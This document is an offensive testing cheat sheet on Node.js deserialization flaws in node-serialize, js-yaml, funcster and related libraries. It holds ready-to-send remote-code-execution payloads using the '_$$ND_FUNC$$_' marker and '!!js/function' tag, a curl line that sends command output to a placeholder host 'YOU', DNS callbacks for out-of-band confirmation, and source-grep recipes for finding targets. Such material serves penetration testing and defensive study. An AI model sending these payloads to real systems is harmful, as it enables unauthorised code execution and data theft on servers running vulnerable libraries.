# Node.js Deserialization — serialize-js, node-serialize, funcster, js-yaml

## The shapes — Node has no native binary serializer

JavaScript serializes as JSON — the "deserialization" bugs are libraries that
smuggle *functions and typed objects* through a JSON-looking container.

| Library | Marker | Sink |
|---|---|---|
| `node-serialize` | `_$$ND_FUNC$$_` prefix on a string | `unserialize` evals the function then calls it |
| `serialize-javascript` | `{"fn":"function()..."}` hints | evals on revive |
| `funcster` | `$$__FUNCTION__$$` | same |
| `js-yaml` ≤3.x | `!!js/function 'code'` | loads a real function object |
| `devalue` | typed-array refs | object-graph revival |
| `superjson` | typed meta | revival |

## node-serialize — the `_$$ND_FUNC$$_` bug (CVE-2017-5941)

```js
// vulnerable:
var serialize = require('node-serialize');
serialize.unserialize(req.body.data);

// the payload — a function in a JSON string field
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

The trailing `()` — `unserialize` wraps the function then immediately invokes
it when it sees `_$$ND_FUNC$$_`. Without `()`, the function is revived but
never called → silent. The `()` is the classic missed character.

```js
// full body shape
{"username":"x","rce":"_$$ND_FUNC$$_function(){var c=require('child_process');c.exec('curl http://YOU/`id|base64 -w0`')}()"}
```

### What reaches it in source

```js
serialize.unserialize(...)          // the sink
require('node-serialize')
require('funcster')
require('serialize-javascript')     // when fed user JSON + a custom reviver
```

## js-yaml ≤3.x — `!!js/function`

```yaml
fn: !!js/function 'function(){ return require("child_process").execSync("id") }'
# then the app calls the revived function → RCE
```

`yaml.load` pre-4.0 revives `!!js/function` as a real function — `safeLoad`
did not. js-yaml 4.x removed `!!js/function` entirely. Version-gate matters.

## The weaker-but-real paths

- **`devalue`/`superjson`** — a JSON+meta container that revives typed
  objects (Map/Set/Date/custom classes). If a revived class has a
  `fromJSON`/hydrate that does something, your `meta` picks the class.
- **JSON.parse + `eval` on a field** — not deserialization, but the bug is
  shaped the same: a JSON field reaches `eval`/`new Function`.
- **BSON/Mongo `$where`** — a JSON field reaching `eval` in a query — the
  NoSQL overlap.
- **EJS `client:true` compile** — a template string passed as an option —
  the SSTI overlap.

## The discovery recipe

```bash
# grep source for the sink packages:
grep -rE "node-serialize|funcster|serialize-javascript|js-yaml|devalue|superjson" --include='*.js' --include='package.json' .

# the lockfile pins the version:
grep -A1 '"node-serialize"' package-lock.json
grep -A1 '"js-yaml"' package-lock.json
```

## The trigger-vs-revive distinction — the #1 mistake

`unserialize`/`decode` *revives* the object graph; a function only RUNS if:

- node-serialize — the `_$$ND_FUNC$$_` string ends with `()` (auto-invoke)
- js-yaml `!!js/function` — the app calls the revived function afterwards
- a custom reviver invokes what it builds

No `()` / no call → the payload is inert — always check whether the app
*invokes* the revived value, not just revives it.

## OOB confirmation

```js
{"x":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOU/x')}()"}
{"x":"_$$ND_FUNC$$_function(){require('dns').lookup('x.YOU')}()"}
```

A DNS/HTTP hit confirms `unserialize`+invoke ran — build the real payload
after the confirm.

## Falsifiers

- `JSON.parse` only — no `node-serialize`/`funcster`/custom reviver on the
  path → plain JSON, class dead.
- js-yaml ≥4.0 — `!!js/function` is gone → only data tags.
- `unserialize` result is never invoked → inert revival, try to reach the
  call site or a `__proto__`/pollution path instead.

## Output to record

- The library + version that carries the revive
- Whether the payload ends with `()` (the auto-invoke)
- The verbatim response / OOB line proving invocation
